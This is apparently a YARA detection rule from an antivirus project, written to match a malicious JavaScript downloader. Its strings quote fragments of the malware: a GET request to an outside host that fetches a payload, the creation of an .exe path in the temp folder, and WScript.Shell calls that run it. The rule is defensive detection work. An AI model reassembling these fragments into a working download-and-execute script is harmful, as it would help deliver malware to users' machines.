rule sig_20160328_a855c534d9b7d7a348936dca3f19379a {
  meta:
    description = "datamaliciousorder - file 20160328_a855c534d9b7d7a348936dca3f19379a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bde87126a294177076e94b59a32efad038b852ad8edced94a2f65caa92ab3b27"

  strings:
    $s1  = "function Ducip() {return Pczbve[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"yfxB4GZLKg9.exe\";};" fullword ascii
    $s2  = "do {WScript[Hzjaoocck](Ihbybh() * 11)} while (Fykvnf[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Fykvnf[Iggnomvlnv](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s4  = "var Pczbve = function Brklkm() {return WScript[Xdjsqrajj](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Hkqmbhul(Rnaaio, Urvtxmkacn){return Rnaaio - Urvtxmkacn;};" fullword ascii
    $s6  = "function Qhnircwfr()" fullword ascii
    $s7  = "function Jjanka() {return ((Htyqypt == true) && (Htyqypt == Ydpjguredi)) ? 1 : Zizecmux;};" fullword ascii
    $s8  = "function Bqtida(Ctkbheohh){Pczbve[\"Run\"](Ctkbheohh, Zizecmux, Zizecmux);};" fullword ascii
    $s9  = "function Hcqazcyyb(){return Xdjsqrajj;};" fullword ascii
    $s10 = "var Ygcwcnjsjz = new this[\"Date\"]();" fullword ascii
    $s11 = "function Ihbybh(){return 22;};" fullword ascii
    $s12 = "var Ydpjguredi = false;" fullword ascii
    $s13 = "var Htyqypt = false;" fullword ascii
    $s14 = "Ydpjguredi = true; " fullword ascii
    $s15 = "function Jryidfii(){return Byuhrnv;};" fullword ascii
    $s16 = "Htyqypt = true; " fullword ascii
    $s17 = " while (Efltgkhil){" fullword ascii
    $s18 = "return Hkqmbhul(Tlirrwisth, Wtuhqpnnpp);" fullword ascii
    $s19 = "var Htbhrkh = false;" fullword ascii
    $s20 = "} catch(Pjlnpz){Efltgkhil = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}